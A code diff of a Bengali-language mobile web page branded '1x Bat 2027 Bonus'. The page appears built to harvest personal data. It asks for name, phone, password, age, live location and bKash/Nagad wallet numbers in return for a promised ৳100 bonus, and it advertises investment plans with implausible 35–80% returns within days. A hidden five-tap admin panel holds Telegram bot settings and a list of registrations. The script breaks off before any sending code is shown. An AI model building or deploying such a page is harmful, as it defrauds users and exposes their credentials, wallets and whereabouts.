@@ -2,333 +2,1373 @@
 <html lang="bn">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Bonus Registration & Earning App</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>1x Bat 2027 Bonus & Tasks</title>
 <style>
 :root{
-  --bg:#030a06; --card:#091710; --line:#1b3d2b;
-  --green:#1be092; --gold:#ffd34d; --text:#f7fff9; --muted:#9bb0a3;
+  --bg:#020704;
+  --card:#07120d;
+  --card2:#0b1912;
+  --line:#1e3d2e;
+  --green:#1be092;
+  --green2:#0ebc75;
+  --gold:#ffd34d;
+  --gold2:#ffb81f;
+  --text:#f7fff9;
+  --muted:#9bb0a3;
+  --danger:#ff7587;
 }
-*{box-sizing:border-box;margin:0;padding:0}
-body{
-  font-family:Arial, sans-serif; background:var(--bg); color:var(--text);
-  display:flex; justify-content:center; min-height:100vh; padding-bottom:60px;
+*{box-sizing:border-box}
+html,body{
+  margin:0;min-height:100%;
+  font-family:Arial,"Noto Sans Bengali",sans-serif;
+  color:var(--text);
+  background:radial-gradient(circle at 50% -10%,#12452f 0,#04110b 35%,#010302 80%);
 }
-.app-container{width:100%; max-width:440px; padding:16px;}
+body{overflow-x:hidden;padding-bottom:50px}
+.page{
+  width:100%;
+  max-width:460px;
+  margin:auto;
+  min-height:100vh;
+  padding:18px 16px 42px;
+  position:relative;
+}
+.ambient{
+  position:fixed;
+  inset:0;
+  pointer-events:none;
+  overflow:hidden;
+  z-index:0;
+}
+.orb{
+  position:absolute;
+  border-radius:50%;
+  filter:blur(10px);
+  opacity:.16;
+  animation:orbFloat 8s ease-in-out infinite;
+}
+.orb.one{width:180px;height:180px;background:#2dffab;left:-80px;top:12%}
+.orb.two{width:140px;height:140px;background:#ffd34d;right:-60px;top:42%;animation-delay:-3s}
+.orb.three{width:200px;height:200px;background:#1cff8d;left:20%;bottom:-110px;animation-delay:-5s}
+@keyframes orbFloat{
+  0%,100%{transform:translateY(0) scale(1)}
+  50%{transform:translateY(-24px) scale(1.06)}
+}
+.content{position:relative;z-index:1}
+.top-badge{
+  position:relative;
+  overflow:hidden;
+  text-align:center;
+  padding:15px 14px;
+  margin-bottom:13px;
+  border-radius:20px;
+  border:1px solid rgba(255,211,77,.26);
+  background:linear-gradient(135deg,#0e3021,#0a1a12);
+  box-shadow:0 16px 42px rgba(0,0,0,.28);
+}
+.brand{
+  font-weight:1000;
+  font-size:20px;
+  letter-spacing:.5px;
+  color:#fff;
+}
+.brand span{color:var(--gold)}
+.brand-sub{
+  margin-top:5px;
+  font-size:11px;
+  letter-spacing:2.4px;
+  color:#bafbdd;
+  font-weight:900;
+}
+.hero{
+  position:relative;
+  overflow:hidden;
+  padding:24px 18px 22px;
+  border-radius:30px;
+  text-align:center;
+  background:linear-gradient(155deg,#11563a,#07301f 48%,#06180f);
+  border:1px solid rgba(255,211,77,.26);
+  box-shadow:0 26px 70px rgba(0,0,0,.42);
+}
+.gift{
+  width:70px;height:70px;
+  margin:auto;
+  display:grid;place-items:center;
+  border-radius:23px;
+  font-size:36px;
+  background:linear-gradient(145deg,#ffd958,#e69b00);
+  box-shadow:0 14px 35px rgba(255,193,31,.25);
+}
+.hero .welcome{
+  margin-top:14px;
+  letter-spacing:3px;
+  font-size:11px;
+  font-weight:900;
+  color:#caffea;
+}
+.hero h1{margin:9px 0 4px;font-size:23px}
+.money{
+  display:inline-block;
+  margin:10px 0 8px;
+  font-size:45px;
+  line-height:1;
+  font-weight:1000;
+  color:var(--gold);
+}
+.pay-mini{
+  display:flex;
+  justify-content:center;
+  gap:9px;
+  margin-top:16px;
+}
+.pay-mini span{
+  padding:8px 14px;
+  border-radius:999px;
+  background:rgba(1,8,5,.34);
+  border:1px solid rgba(255,255,255,.08);
+  font-size:12px;
+  font-weight:900;
+}
+.nav-tabs{
+  display:flex;
+  gap:8px;
+  margin-top:15px;
+  background:#07120d;
+  padding:6px;
+  border-radius:18px;
+  border:1px solid var(--line);
+}
+.nav-tab{
+  flex:1;
+  padding:10px 6px;
+  border:0;
+  border-radius:13px;
+  background:transparent;
+  color:var(--muted);
+  font-weight:900;
+  font-size:12px;
+  cursor:pointer;
+  transition:.2s;
+}
+.nav-tab.active{
+  background:linear-gradient(135deg,#12452f,#0b2d1e);
+  color:#fff;
+  border:1px solid rgba(27,224,146,.3);
+}
 .card{
-  background:var(--card); border:1px solid var(--line);
-  border-radius:20px; padding:20px; margin-bottom:15px;
+  margin-top:15px;
+  padding:22px 18px;
+  border-radius:29px;
+  background:linear-gradient(180deg,rgba(12,27,19,.98),rgba(4,12,8,.98));
+  border:1px solid var(--line);
+  box-shadow:0 25px 65px rgba(0,0,0,.38);
 }
-.balance-card{
-  background:linear-gradient(135deg,#0e3a27,#061a11);
-  text-align:center; border:1px solid var(--green);
+.head{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:19px;
 }
-.balance-card h3{color:var(--muted); font-size:13px;}
-.balance-card h1{color:var(--gold); font-size:42px; margin:8px 0;}
-.btn{
-  width:100%; padding:14px; border:0; border-radius:12px;
-  background:linear-gradient(135deg,#1be092,#0ebc75);
-  color:#03140c; font-weight:bold; font-size:15px; cursor:pointer; margin-top:10px;
+.head-icon{
+  width:48px;height:48px;
+  display:grid;place-items:center;
+  border-radius:16px;
+  font-size:23px;
+  background:linear-gradient(145deg,#123d2b,#0b251a);
+  border:1px solid #295c43;
 }
-.btn-gold{background:linear-gradient(135deg,#ffd34d,#e69b00); color:#3d2800;}
+.head h2{margin:0;font-size:20px}
+.head p{margin:4px 0 0;color:var(--muted);font-size:12px}
+.msg{
+  display:none;
+  padding:12px 13px;
+  margin-bottom:13px;
+  border-radius:14px;
+  font-size:12px;
+  line-height:1.55;
+}
+.msg.error{display:block;color:#ffb0ba;background:#35161b;border:1px solid #7b3540}
+.msg.success,.msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
+.field{margin-bottom:14px}
+.label{
+  display:block;
+  margin:0 0 7px 4px;
+  color:#c3d0c9;
+  font-size:12px;
+  font-weight:800;
+}
+.input-wrap{position:relative}
+.ico{
+  position:absolute;
+  left:15px;top:50%;
+  transform:translateY(-50%);
+  font-size:20px;
+}
 input, select{
-  width:100%; height:48px; padding:0 14px; border-radius:12px;
-  border:1px solid var(--line); background:#040d07; color:#fff; margin-top:8px; outline:none;
+  width:100%;
+  height:56px;
+  padding:0 14px 0 49px;
+  border-radius:17px;
+  border:1px solid #294338;
+  background:#06100b;
+  color:#fff;
+  outline:none;
+  font-size:15px;
 }
-.nav-bar{
-  position:fixed; bottom:0; left:50%; transform:translateX(-50%);
-  width:100%; max-width:440px; background:#06140c; border-top:1px solid var(--line);
-  display:flex; justify-app:space-around; padding:10px 0;
+input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27,224,146,.08)}
+.hint{margin:-4px 3px 14px;color:#86a494;font-size:10px;line-height:1.5}
+.allow-btn{
+  position:relative;
+  overflow:hidden;
+  width:100%;
+  height:64px;
+  margin-top:8px;
+  border:0;
+  border-radius:19px;
+  cursor:pointer;
+  color:#062115;
+  background:linear-gradient(135deg,#f8d650 0%,#ffc52b 42%,#24e79f 100%);
+  box-shadow:0 15px 36px rgba(24,205,137,.2);
+  font-weight:1000;
+  font-size:17px;
 }
-.nav-item{color:var(--muted); text-decoration:none; font-size:12px; text-align:center; cursor:pointer;}
-.nav-item.active{color:var(--green); font-weight:bold;}
+.allow-btn:disabled{filter:saturate(.45);cursor:not-allowed}
+.btn-inner{
+  position:relative;
+  z-index:2;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+}
+.coin-stack{position:relative;width:34px;height:32px}
+.coin{
+  position:absolute;
+  width:21px;height:21px;
+  border-radius:50%;
+  display:grid;place-items:center;
+  font-size:12px;
+  font-weight:1000;
+  background:linear-gradient(145deg,#fff4a4,#ffb800);
+  border:2px solid #f2a700;
+  color:#785000;
+}
+.coin.c1{left:0;bottom:0}
+.coin.c2{left:12px;bottom:5px}
+.coin.c3{left:6px;bottom:12px}
+.note{margin-top:13px;text-align:center;color:#82988c;font-size:10px;line-height:1.55}
+.check{
+  width:64px;height:64px;
+  margin:auto;
+  display:grid;place-items:center;
+  border-radius:21px;
+  font-size:30px;
+  background:#0e3827;
+  border:1px solid #2e7455;
+}
+.payment-title h2{margin:12px 0 5px}
+.payment-title p{margin:0;color:var(--muted);font-size:12px}
+.pay-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:18px 0}
+.pay-option input{display:none}
+.pay-card{
+  height:96px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:7px;
+  border-radius:19px;
+  background:#07110c;
+  border:2px solid #2c4137;
+  cursor:pointer;
+}
+.pay-option input:checked + .pay-card{
+  border-color:var(--green);
+  background:#0c2b1e;
+}
+.pay-icon{font-size:27px}
+.success-box{text-align:center;padding:20px 5px}
+.success-icon{
+  width:84px;height:84px;
+  margin:auto;
+  border-radius:50%;
+  display:grid;place-items:center;
+  font-size:42px;
+  background:linear-gradient(145deg,#0f402c,#0a2a1d);
+  border:1px solid #2d7656;
+}
+.success-box h2{margin:15px 0 7px}
+.success-box p{color:#9eb0a7;font-size:13px;line-height:1.65}
 .task-item, .plan-item{
-  display:flex; justify-content:space-between; align-items:center;
-  background:#040e08; padding:12px; border-radius:12px; border:1px solid #142e20; margin-top:10px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:15px;
+  margin-bottom:12px;
+  border-radius:16px;
+  background:#06110b;
+  border:1px solid #20392d;
 }
-.pay-logo{width:32px; vertical-align:middle; margin-right:5px;}
-.hidden{display:none;}
-.msg{padding:10px; border-radius:8px; font-size:12px; margin-bottom:10px;}
-.msg.error{background:#3a1418; color:#ff8e99;}
-.msg.success{background:#0e3824; color:#7ef5be;}
+.task-info h4{margin:0 0 4px;font-size:15px}
+.task-info p{margin:0;color:var(--muted);font-size:11px}
+.task-btn{
+  padding:8px 14px;
+  border-radius:10px;
+  font-weight:900;
+  font-size:12px;
+  border:0;
+  background:var(--green);
+  color:#062015;
+  cursor:pointer;
+}
+
+/* ADMIN */
+.admin-modal,.admin-panel{display:none}
+.admin-modal{
+  position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,.82);
+  backdrop-filter:blur(10px);
+  align-items:center;justify-content:center;
+  padding:18px;
+}
+.admin-modal.show{display:flex}
+.admin-login{
+  width:min(100%,390px);
+  padding:20px;border-radius:24px;
+  background:#08140e;border:1px solid #2a5a42;
+}
+.admin-login h3{margin:0 0 5px;font-size:20px}
+.admin-login p{margin:0 0 15px;color:var(--muted);font-size:12px}
+.admin-actions{display:flex;gap:9px}
+.admin-secondary{
+  width:100%;height:52px;border-radius:15px;
+  border:1px solid #33483e;background:#111b16;
+  color:#fff;font-weight:900;cursor:pointer;
+}
+.admin-panel{
+  position:fixed;inset:0;z-index:90;
+  overflow:auto;background:#031008;
+  padding:14px;
+}
+.admin-panel.show{display:block}
+.admin-shell{max-width:900px;margin:auto}
+.admin-top{
+  display:flex;align-items:center;justify-content:space-between;
+  gap:10px;margin-bottom:12px;
+}
+.admin-top h2{margin:0;font-size:21px}
+.admin-top small{color:var(--muted)}
+.admin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.stat{padding:14px;border-radius:16px;background:#0a1710;border:1px solid #213d2f}
+.stat b{display:block;font-size:24px;color:#fff}
+.stat span{font-size:10px;color:var(--muted)}
+.admin-card{margin-top:11px;padding:15px;border-radius:19px;background:#08140e;border:1px solid #203a2d}
+.admin-card h3{margin:0 0 12px}
+.admin-search{padding-left:14px!important}
+.record{margin-top:10px;padding:13px;border-radius:16px;background:#050e09;border:1px solid #1c3328}
+.record-top{display:flex;align-items:flex-start;justify-content:space-between;gap:10px}
+.record h4{margin:0 0 6px}
+.record .meta{color:#9db0a5;font-size:11px;line-height:1.65}
+.badge{
+  padding:5px 8px;border-radius:99px;
+  font-size:9px;font-weight:1000;
+  background:#113725;color:#78efba;white-space:nowrap;
+}
+.badge.pending{background:#3b2a11;color:#ffda73}
+.admin-btn{border:0;border-radius:10px;padding:9px 11px;font-weight:900;cursor:pointer}
+.admin-green{background:#19df92;color:#062015}
+.admin-dark{background:#15211b;color:#fff;border:1px solid #30483d}
+.admin-red{background:#35161b;color:#ff9fab;border:1px solid #71313c}
+.admin-row{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+.admin-note{font-size:10px;color:#82988c;line-height:1.5}
+.admin-msg{display:none;margin-top:9px;padding:10px;border-radius:12px;font-size:11px}
+.admin-msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
+.admin-msg.error{display:block;background:#35161b;border:1px solid #7b3540;color:#ffb0ba}
+.hidden{display:none!important}
 </style>
 </head>
 <body>
 
-<div class="app-container">
-
-  <!-- AUTH SECTION (Login/Register) -->
-  <div id="authSection">
-    <div class="card">
-      <h2 id="authTitle" style="text-align:center; margin-bottom:15px;">একাউন্ট খুলুন</h2>
-      <div id="authMsg" class="msg hidden"></div>
-      
-      <div id="nameField">
-        <label>আপনার নাম</label>
-        <input type="text" id="name" placeholder="নাম লিখুন">
-      </div>
-      
-      <label style="margin-top:10px; display:block;">মোবাইল নম্বর</label>
-      <input type="tel" id="phone" placeholder="01XXXXXXXXX">
-
-      <label style="margin-top:10px; display:block;">পাসওয়ার্ড</label>
-      <input type="password" id="password" placeholder="****">
-
-      <div id="ageField">
-        <label style="margin-top:10px; display:block;">বয়স</label>
-        <input type="number" id="age" placeholder="18+">
-      </div>
-
-      <button class="btn" id="authBtn" onclick="handleAuth()">CREATE ACCOUNT</button>
-      
-      <p style="text-align:center; margin-top:15px; font-size:12px; color:var(--muted); cursor:pointer;" onclick="toggleAuthMode()">
-        <span id="toggleText">ইতিমধ্যে একাউন্ট আছে? লগইন করুন</span>
-      </p>
-    </div>
-  </div>
-
-  <!-- MAIN APP DASHBOARD -->
-  <div id="appSection" class="hidden">
-    
-    <!-- Balance Card -->
-    <div class="card balance-card">
-      <h3>আপনার মোট ব্যালেন্স</h3>
-      <h1 id="userBalance">৳0</h1>
-      <p style="font-size:12px; color:#85d6b0;" id="userName">User Name</p>
-    </div>
-
-    <!-- Navigation Tabs -->
-    <div style="display:flex; gap:8px; margin-bottom:15px;">
-      <button class="btn" style="flex:1; margin:0;" onclick="showTab('tasks')">Tasks</button>
-      <button class="btn btn-gold" style="flex:1; margin:0;" onclick="showTab('invest')">Invest</button>
-      <button class="btn" style="flex:1; margin:0; background:#214d38; color:#fff;" onclick="showTab('withdraw')">Withdraw</button>
-    </div>
-
-    <!-- TASKS TAB -->
-    <div id="tabTasks" class="card">
-      <h3>দৈনিক টাস্ক</h3>
-      <div id="taskMsg" class="msg hidden"></div>
-      <div id="tasksContainer"></div>
-    </div>
-
-    <!-- INVEST TAB -->
-    <div id="tabInvest" class="card hidden">
-      <h3>ইনভেস্টমেন্ট প্ল্যান</h3>
-      <p style="font-size:12px; color:var(--muted);">মেয়াদ শেষে বড় লভ্যাংশ পান</p>
-      
-      <div class="plan-item">
-        <div><b>৩ দিন মেয়াদী</b><br><small style="color:var(--green)">+৩৫% রিটার্ন</small></div>
-        <button class="btn btn-gold" style="width:auto; padding:8px 15px;" onclick="invest(3, 35)">ইনভেস্ট ৳৫০০</button>
-      </div>
-
-      <div class="plan-item">
-        <div><b>৭ দিন (১ সপ্তাহ)</b><br><small style="color:var(--green)">+৫০% রিটার্ন</small></div>
-        <button class="btn btn-gold" style="width:auto; padding:8px 15px;" onclick="invest(7, 50)">ইনভেস্ট ৳১০০০</button>
-      </div>
-
-      <div class="plan-item">
-        <div><b>১৫ দিন মেয়াদী</b><br><small style="color:var(--green)">+৬৫% রিটার্ন</small></div>
-        <button class="btn btn-gold" style="width:auto; padding:8px 15px;" onclick="invest(15, 65)">ইনভেস্ট ৳২০০০</button>
-      </div>
-
-      <div class="plan-item">
-        <div><b>৩০ দিন মেয়াদী</b><br><small style="color:var(--green)">+৮০% রিটার্ন</small></div>
-        <button class="btn btn-gold" style="width:auto; padding:8px 15px;" onclick="invest(30, 80)">ইনভেস্ট ৳৫০০০</button>
-      </div>
-    </div>
-
-    <!-- WITHDRAW TAB -->
-    <div id="tabWithdraw" class="card hidden">
-      <h3>টাকা তুলুন (Withdraw)</h3>
-      <div id="withdrawMsg" class="msg hidden"></div>
-      
-      <label>মেথড সিলেক্ট করুন</label>
-      <select id="withdrawMethod">
-        <option value="bKash">📱 bKash (বিকাশ)</option>
-        <option value="Nagad">💳 Nagad (নগদ)</option>
-      </select>
-
-      <label style="margin-top:10px; display:block;">bKash / Nagad নম্বর</label>
-      <input type="tel" id="withdrawNum" placeholder="01XXXXXXXXX">
-
-      <label style="margin-top:10px; display:block;">টাকার পরিমাণ (সর্বনিম্ন ৳৫০০)</label>
-      <input type="number" id="withdrawAmount" placeholder="500">
-
-      <button class="btn" onclick="submitWithdraw()">WITHDRAW NOW</button>
-    </div>
-
-    <button class="btn" style="background:#3a1418; color:#ff8e99; margin-top:20px;" onclick="logout()">Logout</button>
-  </div>
-
+<div class="ambient">
+  <div class="orb one"></div>
+  <div class="orb two"></div>
+  <div class="orb three"></div>
 </div>
 
-<script>
-let currentUser = null;
-let isLoginMode = false;
+<main class="page">
+  <div class="content">
 
+    <section class="top-badge">
+      <div class="brand">1x Bat <span>2027 BONUS</span></div>
+      <div class="brand-sub">LIMITED WELCOME REWARD</div>
+    </section>
+
+    <!-- App Hero Section with Persistent Balance -->
+    <section class="hero">
+      <div class="gift">🎁</div>
+      <div class="welcome" id="adminTapTarget" style="cursor:pointer;user-select:none">WELCOME BONUS</div>
+      <h1>একাউন্ট খুললেই পাচ্ছেন</h1>
+      <div class="money" id="displayBalance">৳100</div>
+      <p id="heroSubText">রেজিস্ট্রেশন সম্পন্ন করে আপনার পছন্দের মাধ্যমে গ্রহণ করুন</p>
+      
+      <div class="pay-mini">
+        <span>📱 bKash</span>
+        <span>💳 Nagad</span>
+      </div>
+
+      <!-- Navigation Tabs (Only visible after login/registration) -->
+      <div class="nav-tabs hidden" id="appNavTabs">
+        <button class="nav-tab active" id="tabHomeBtn" onclick="switchTab('home')">🏠 Home</button>
+        <button class="nav-tab" id="tabTasksBtn" onclick="switchTab('tasks')">📋 Tasks</button>
+        <button class="nav-tab" id="tabInvestBtn" onclick="switchTab('invest')">📈 Invest</button>
+        <button class="nav-tab" id="tabWithdrawBtn" onclick="switchTab('withdraw')">💸 Withdraw</button>
+      </div>
+    </section>
+
+    <!-- AUTH & REGISTRATION VIEW -->
+    <div id="authView">
+      
+      <!-- LOGIN / REGISTER TOGGLE CARD -->
+      <div class="card" id="loginCard" style="display:none;">
+        <div class="head">
+          <div class="head-icon">🔑</div>
+          <div>
+            <h2>একাউন্ট লগইন</h2>
+            <p>আপনার মোবাইল নাম্বার ও পাসওয়ার্ড দিয়ে প্রবেশ করুন</p>
+          </div>
+        </div>
+        <div class="msg" id="loginMsg"></div>
+        <div class="field">
+          <label class="label">ফোন নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">📱</span>
+            <input id="loginPhone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+        <div class="field">
+          <label class="label">পাসওয়ার্ড</label>
+          <div class="input-wrap">
+            <span class="ico">🔒</span>
+            <input id="loginPassword" type="password" placeholder="পাসওয়ার্ড লিখুন">
+          </div>
+        </div>
+        <button class="allow-btn" id="loginBtn" onclick="handleLogin()">
+          <span class="btn-inner"><span>LOGIN →</span></span>
+        </button>
+        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(false)">
+          নতুন একাউন্ট খুলতে চান? রেজিস্ট্রেশন করুন
+        </div>
+      </div>
+
+      <!-- REGISTRATION STEP 1 -->
+      <section class="card" id="registerStep">
+        <div class="head">
+          <div class="head-icon">👤</div>
+          <div>
+            <h2>নতুন একাউন্ট</h2>
+            <p>নিচের তথ্যগুলো সঠিকভাবে পূরণ করুন</p>
+          </div>
+        </div>
+
+        <div class="msg" id="formMsg"></div>
+
+        <div class="field">
+          <label class="label">আপনার নাম</label>
+          <div class="input-wrap">
+            <span class="ico">👤</span>
+            <input id="name" type="text" placeholder="পূর্ণ নাম লিখুন">
+          </div>
+        </div>
+
+        <div class="field">
+          <label class="label">ফোন নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">📱</span>
+            <input id="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+
+        <div class="field">
+          <label class="label">পাসওয়ার্ড</label>
+          <div class="input-wrap">
+            <span class="ico">🔒</span>
+            <input id="password" type="password" placeholder="কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড">
+          </div>
+        </div>
+
+        <div class="hint">✓ একটি ফোন নাম্বার দিয়ে শুধু একবার রেজিস্ট্রেশন করা যাবে</div>
+
+        <div class="field">
+          <label class="label">বয়স</label>
+          <div class="input-wrap">
+            <span class="ico">🎂</span>
+            <input id="age" type="number" min="18" max="100" placeholder="18+">
+          </div>
+        </div>
+
+        <button class="allow-btn" id="allowBtn">
+          <span class="btn-inner">
+            <span class="coin-stack">
+              <span class="coin c1">৳</span>
+              <span class="coin c2">৳</span>
+              <span class="coin c3">৳</span>
+            </span>
+            <span id="allowText">ALLOW LOCATION & REGISTER →</span>
+          </span>
+        </button>
+
+        <div class="note" style="cursor:pointer;color:var(--green);margin-top:12px;" onclick="toggleAuthMode(true)">
+          ইতিমধ্যে একাউন্ট আছে? লগইন করুন
+        </div>
+      </section>
+
+      <!-- REGISTRATION STEP 2 (Payment Method) -->
+      <section class="card" id="paymentStep" style="display:none;">
+        <div class="payment-title">
+          <div class="check">✓</div>
+          <h2>লোকেশন যাচাই সফল</h2>
+          <p>৳100 বোনাস গ্রহণের মাধ্যম নির্বাচন করুন</p>
+        </div>
+
+        <div class="msg" id="paymentMsg"></div>
+
+        <div class="pay-grid">
+          <label class="pay-option">
+            <input type="radio" name="payment" value="bKash">
+            <span class="pay-card">
+              <span class="pay-icon">📱</span>
+              <strong>bKash</strong>
+            </span>
+          </label>
+
+          <label class="pay-option">
+            <input type="radio" name="payment" value="Nagad">
+            <span class="pay-card">
+              <span class="pay-icon">💳</span>
+              <strong>Nagad</strong>
+            </span>
+          </label>
+        </div>
+
+        <div class="field">
+          <label class="label">bKash / Nagad নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">☎️</span>
+            <input id="walletNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+
+        <button class="allow-btn" id="confirmBtn" onclick="submitPayment()">
+          <span class="btn-inner">
+            <span class="coin-stack">
+              <span class="coin c1">৳</span>
+              <span class="coin c2">৳</span>
+              <span class="coin c3">৳</span>
+            </span>
+            <span>CONFIRM BONUS →</span>
+          </span>
+        </button>
+      </section>
+
+      <!-- SUCCESS STEP -->
+      <section class="card" id="successStep" style="display:none;">
+        <div class="success-box">
+          <div class="success-icon">✓</div>
+          <h2>Registration Successful</h2>
+          <p>
+            আপনার তথ্য এবং লাইভ লোকেশন সংরক্ষিত হয়েছে।<br>
+            এখন আপনি ড্যাশবোর্ড থেকে টাস্ক এবং ইনভেস্ট করতে পারবেন।
+          </p>
+          <button class="allow-btn" style="margin-top:20px;" onclick="enterDashboard()">DASHBOARD এ যান →</button>
+        </div>
+      </section>
+
+    </div>
+
+    <!-- MAIN DASHBOARD TABS VIEW (Hidden initially until logged in) -->
+    <div id="dashboardView" class="hidden">
+      
+      <!-- TASKS TAB -->
+      <div id="paneTasks" class="card">
+        <div class="head">
+          <div class="head-icon">📋</div>
+          <div>
+            <h2>Daily Tasks & Rewards</h2>
+            <p>টাস্ক কমপ্লিট করে আপনার ব্যালেন্স বাড়ান</p>
+          </div>
+        </div>
+        <div class="msg" id="taskMsg"></div>
+        <div id="tasksListContainer">
+          <div class="admin-note">টাস্ক লোড হচ্ছে...</div>
+        </div>
+      </div>
+
+      <!-- INVEST TAB -->
+      <div id="paneInvest" class="card hidden">
+        <div class="head">
+          <div class="head-icon">📈</div>
+          <div>
+            <h2>Investment Plans</h2>
+            <p>৩ দিন থেকে ৩০ দিনের আকর্ষণীয় রিটার্ন প্ল্যান</p>
+          </div>
+        </div>
+        
+        <div class="plan-item">
+          <div><b>৩ দিন মেয়াদী</b><br><small style="color:var(--green)">+৩৫% প্রফিট রিটার্ন</small></div>
+          <button class="task-btn" onclick="openInvestModal(3, 35)">Invest</button>
+        </div>
+        <div class="plan-item">
+          <div><b>৭ দিন (১ সপ্তাহ)</b><br><small style="color:var(--green)">+৫০% প্রফিট রিটার্ন</small></div>
+          <button class="task-btn" onclick="openInvestModal(7, 50)">Invest</button>
+        </div>
+        <div class="plan-item">
+          <div><b>১৫ দিন মেয়াদী</b><br><small style="color:var(--green)">+৬৫% প্রফিট রিটার্ন</small></div>
+          <button class="task-btn" onclick="openInvestModal(15, 65)">Invest</button>
+        </div>
+        <div class="plan-item">
+          <div><b>৩০ দিন মেয়াদী</b><br><small style="color:var(--green)">+৮০% প্রফিট রিটার্ন</small></div>
+          <button class="task-btn" onclick="openInvestModal(30, 80)">Invest</button>
+        </div>
+      </div>
+
+      <!-- WITHDRAW TAB -->
+      <div id="paneWithdraw" class="card hidden">
+        <div class="head">
+          <div class="head-icon">💸</div>
+          <div>
+            <h2>Withdraw Funds</h2>
+            <p>বিকাশ বা নগদের মাধ্যমে টাকা তুলুন (সর্বনিম্ন ৳৫০০)</p>
+          </div>
+        </div>
+        <div class="msg" id="withdrawMsg"></div>
+        
+        <div class="field">
+          <label class="label">উইথড্র মেথড</label>
+          <select id="withdrawMethod">
+            <option value="bKash">📱 bKash</option>
+            <option value="Nagad">💳 Nagad</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <label class="label">ওয়ালেট নাম্বার</label>
+          <div class="input-wrap">
+            <span class="ico">☎️</span>
+            <input id="withdrawNumber" type="tel" inputmode="numeric" maxlength="11" placeholder="01XXXXXXXXX">
+          </div>
+        </div>
+
+        <div class="field">
+          <label class="label">টাকার পরিমাণ (৳)</label>
+          <div class="input-wrap">
+            <span class="ico">💵</span>
+            <input id="withdrawAmount" type="number" placeholder="সর্বনিম্ন ৫০০ টাকা">
+          </div>
+        </div>
+
+        <button class="allow-btn" onclick="submitWithdraw()">
+          <span class="btn-inner"><span>SUBMIT WITHDRAW REQUEST →</span></span>
+        </button>
+      </div>
+
+      <button class="allow-btn" style="background:#3a1418;color:#ff8e99;margin-top:20px;" onclick="logout()">LOGOUT</button>
+    </div>
+
+  </div>
+</main>
+
+<!-- ADMIN LOGIN MODAL -->
+<div class="admin-modal" id="adminModal">
+  <div class="admin-login">
+    <h3>🔐 Admin Access</h3>
+    <p>WELCOME BONUS-এ ৫ বার ট্যাপ করলে এই PIN screen আসে</p>
+    <div class="msg" id="adminPinMsg"></div>
+    <div class="field">
+      <label class="label">Admin PIN</label>
+      <div class="input-wrap">
+        <span class="ico">🔑</span>
+        <input id="adminPin" type="password" inputmode="numeric" maxlength="4" placeholder="PIN">
+      </div>
+    </div>
+    <div class="admin-actions">
+      <button class="admin-secondary" id="adminCancel">CANCEL</button>
+      <button class="allow-btn" id="adminLoginBtn" style="height:52px;margin:0">LOGIN</button>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN PANEL -->
+<section class="admin-panel" id="adminPanel">
+  <div class="admin-shell">
+    <div class="admin-top">
+      <div>
+        <h2>🛡️ Bonus Admin Panel</h2>
+        <small>1x Bat 2027 Control Center</small>
+      </div>
+      <button class="admin-btn admin-dark" id="adminLogout">Logout</button>
+    </div>
+
+    <div class="admin-grid">
+      <div class="stat"><b id="statTotal">0</b><span>Total registrations</span></div>
+      <div class="stat"><b id="statBkash">0</b><span>bKash users</span></div>
+      <div class="stat"><b id="statNagad">0</b><span>Nagad users</span></div>
+    </div>
+
+    <div class="admin-card">
+      <h3>🤖 Telegram Settings</h3>
+      <div class="admin-row">
+        <div class="field">
+          <label class="label">Bot Token</label>
+          <input class="admin-search" id="telegramToken" type="password" placeholder="Bot Token">
+        </div>
+        <div class="field">
+          <label class="label">Chat ID</label>
+          <input class="admin-search" id="telegramChatId" type="text" placeholder="Chat ID">
+        </div>
+      </div>
+      <div class="admin-actions" style="gap:10px">
+        <button class="admin-btn admin-green" id="saveTelegramDemo">SAVE SETTINGS</button>
+        <button class="admin-btn admin-dark" id="testTelegramBtn">SEND TEST MSG</button>
+      </div>
+      <div class="admin-msg" id="telegramDemoMsg"></div>
+    </div>
+
+    <div class="admin-card">
+      <h3>👥 Users & Registrations</h3>
+      <div class="field">
+        <input class="admin-search" id="adminSearch" type="text" placeholder="নাম / ফোন / wallet search">
+      </div>
+      <div id="adminRecords"></div>
+    </div>
+  </div>
+</section>
+
+<script>
+const $ = id => document.getElementById(id);
+let currentUser = null;
+let watchId = null;
+
+function validPhone(v){
+  return /^01[3-9]\d{8}$/.test(String(v || "").trim());
+}
+
+function showMsg(id,text,type="error"){
+  const box=$(id);
+  box.className="msg "+type;
+  box.textContent=text;
+  box.style.display="block";
+}
+
+function clearMsg(id){
+  $(id).style.display="none";
+}
+
+function confetti(){
+  const pieces=["💰","🪙","✨","💸"];
+  for(let i=0;i<18;i++){
+    const e=document.createElement("div");
+    e.className="confetti";
+    e.textContent=pieces[Math.floor(Math.random()*pieces.length)];
+    e.style.left=(Math.random()*94)+"vw";
+    e.style.top=(-20-Math.random()*90)+"px";
+    e.style.animationDelay=(Math.random()*.35)+"s";
+    document.body.appendChild(e);
+    setTimeout(()=>e.remove(),2100);
+  }
+}
+
